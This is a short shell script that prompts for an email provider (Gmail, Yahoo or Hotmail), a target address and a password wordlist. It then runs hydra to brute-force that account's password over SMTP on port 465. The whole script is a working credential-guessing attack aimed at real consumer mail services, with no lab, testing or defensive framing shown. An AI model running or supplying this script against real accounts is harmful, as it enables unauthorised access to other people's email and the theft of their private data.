echo Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
read smtp
echo Enter Email Address:
read email
echo Provide Directory of Wordlist for Passwords:
read wordlist
hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp
